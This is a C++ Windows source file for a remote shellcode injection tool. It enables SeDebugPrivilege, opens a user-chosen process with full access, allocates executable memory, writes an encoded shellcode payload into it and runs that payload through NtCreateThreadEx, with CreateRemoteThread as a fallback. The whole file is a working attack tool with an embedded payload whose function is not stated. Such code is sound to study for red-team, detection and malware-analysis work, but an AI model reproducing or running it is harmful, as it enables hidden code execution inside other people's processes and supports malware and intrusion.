// remote.shellcode.injection.cpp : Defines the entry point for the console application.
//
#include "stdafx.h"
#include "windows.h"
#include "iostream"

using namespace std;

typedef NTSTATUS(WINAPI *pNtCreateThreadEx)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN LPVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN LPTHREAD_START_ROUTINE lpStartAddress,
	IN LPVOID lpParameter,
	IN BOOL CreateSuspended,
	IN DWORD StackZeroBits,
	IN DWORD SizeOfStackCommit,
	IN DWORD SizeOfStackReserve,
	OUT LPVOID lpBytesBuffer
	);

int sysError(){

	WCHAR sysMsg[256] = { NULL };

	FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		GetLastError(),
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		sysMsg,
		256,
		NULL);


	wcout << "  FAILED WITH ERROR CODE: " << sysMsg << endl;

	return ERROR_SUCCESS;
}


int SetPrivDebug(){
	DWORD procPID = NULL;
	HANDLE hProcess = NULL;
	HANDLE hToken = NULL;
	LUID luid;
	TOKEN_PRIVILEGES tp;

	procPID = GetCurrentProcessId();
	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, procPID);
	if (hProcess == NULL){
		wcout << "\n  WARNING: OpenProcess() ERROR!" << endl;
		sysError();
		CloseHandle(hProcess);
		return ERROR_SUCCESS;
	}
	BOOL procToken = OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken);
	if (procToken == NULL){
		wcout << "\n  WARNING: OpenProcessToken() ERROR!" << endl;
		sysError();
		CloseHandle(hToken);
		return ERROR_SUCCESS;
	}
	if (!LookupPrivilegeValue(NULL, TEXT("SeDebugPrivilege"), &luid)){
		wcout << "\n  WARNING: LookupPrivilegeValue() ERROR!" << endl;
		sysError();
		return ERROR_SUCCESS;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)){
		wcout << "\n  WARNING: AdjustTokenPrivileges() ERROR!" << endl;
		sysError();
		return ERROR_SUCCESS;
	}
	return ERROR_SUCCESS;
}



int _tmain(int argc, _TCHAR* argv[])
{
	HANDLE hProcess = NULL;
	int procPID;
	LPVOID memAddress = NULL;
	int wProcMem = 0;
	HANDLE threadID = NULL;
	const char shellcode[] = "\xb8\xe0\x20\xa7\x98\xdb\xd1\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
		"\x42\x31\x42\x12\x83\xc2\x04\x03\xa2\x2e\x45\x6d\xfb\xc4\x12"
		"\x57\x8f\x3e\xd1\x59\xbd\x8d\x6e\xab\x88\x96\x1b\xba\x3a\xdc"
		"\x6a\x31\xb1\x94\x8e\xc2\x83\x50\x24\xaa\x2b\xea\x0c\x6b\x64"
		"\xf4\x05\x78\x23\x05\x37\x81\x32\x65\x3c\x12\x90\x42\xc9\xae"
		"\xe4\x01\x99\x18\x6c\x17\xc8\xd2\xc6\x0f\x87\xbf\xf6\x2e\x7c"
		"\xdc\xc2\x79\x09\x17\xa1\x7b\xe3\x69\x4a\x4a\x3b\x75\x18\x29"
		"\x7b\xf2\x67\xf3\xb3\xf6\x66\x34\xa0\xfd\x53\xc6\x13\xd6\xd6"
		"\xd7\xd7\x7c\x3c\x19\x03\xe6\xb7\x15\x98\x6c\x9d\x39\x1f\x98"
		"\xaa\x46\x94\x5f\x44\xcf\xee\x7b\x88\xb1\x2d\x31\xb8\x18\x66"
		"\xbf\x5d\xd3\x44\xa8\x13\xaa\x46\xc5\x79\xdb\xc8\xea\x82\xe4"
		"\x7e\x51\x78\xa0\xff\x82\x62\xa5\x78\x2e\x46\x18\x6f\xc1\x79"
		"\x63\x90\x57\xc0\x94\x07\x04\xa6\x84\x96\xbc\x05\xf7\x36\x59"
		"\x01\x82\x35\xc4\xa3\xe4\xe6\x22\x49\x7c\xf0\x7d\xb2\x2b\xf9"
		"\x08\x8e\x84\xba\xa3\xac\x68\x01\x34\xac\x56\x2b\xd3\xad\x69"
		"\x34\xdc\x45\xce\xeb\x03\xb5\x86\x89\x70\x86\x30\x7f\xac\x60"
		"\xe0\x5b\x56\xf9\xfa\xcc\x0e\xd9\xdc\x2c\xc7\x7b\x72\x55\x36"
		"\x13\xf8\xcd\x5d\xc3\x68\x5e\xf1\x73\x49\x6f\xc4\xfb\xc5\xab"
		"\xda\x72\x34\x82\x30\xd6\xe4\xb4\xe6\x29\xda\x06\xc7\x85\x24"
		"\x3d\xcf";


	SetPrivDebug();
	wcout << "\nProcess PID:";
	cin >> procPID;
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procPID);

	if (hProcess == NULL){
		wcout << "\n  WARNING: OpenProcess() ERROR!" << endl;
		sysError();
		CloseHandle(hProcess);
		return ERROR_SUCCESS;
	}

	memAddress = (LPVOID)VirtualAllocEx(hProcess, NULL, strlen(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (memAddress == NULL){
		wcout << "\n  WARNING: VirtualAllocEx() ERROR!" << endl;
		sysError();
		return ERROR_SUCCESS;
	}

	wProcMem = WriteProcessMemory(hProcess, memAddress, shellcode, strlen(shellcode), NULL);
	if (wProcMem == NULL){
		wcout << "\n  WARNING: WriteProcessMemory() ERROR!" << endl;
		sysError();
		return ERROR_SUCCESS;
	}

	// taken from https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/CodeInjection/NtCreateThreadEx.cpp
	HMODULE hNtdll;
	pNtCreateThreadEx NtCreateThreadEx = NULL;
	hNtdll = GetModuleHandle(_T("ntdll.dll"));
	// Get the address NtCreateThreadEx
	_tprintf(_T("\t[+] Looking for NtCreateThreadEx in ntdll\n"));
	NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
	if (NtCreateThreadEx == NULL) {
		wcout << "\n  WARNING: GetProcAddress() ERROR!" << endl;
		
		return FALSE;
	}
	_tprintf(_T("\t[+] Found at 0x%08x\n"), (UINT)NtCreateThreadEx);

	int status = 0;
	status = NtCreateThreadEx(&threadID, GENERIC_ALL, NULL, hProcess, (LPTHREAD_START_ROUTINE)memAddress, memAddress, FALSE, NULL, NULL, NULL, NULL);
	if (status < 0) {
		wcout << "\n  WARNING: NtCreateThreadEx() ERROR!" << endl;
		CloseHandle(threadID);
		threadID = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)memAddress, memAddress, 0, NULL);
		if (threadID == NULL){
			wcout << "\n  WARNING: CreateRemoteThready() ERROR!" << endl;
			sysError();
			CloseHandle(threadID);
			return ERROR_SUCCESS;
		}
		else wcout << "CreateThread SUCCESS :)" << endl;

		return FALSE;

	}
	else wcout << "NtCreateThreadEx SUCCESS :)" << endl;

	CloseHandle(hProcess);
	CloseHandle(threadID);

	return ERROR_SUCCESS;
}
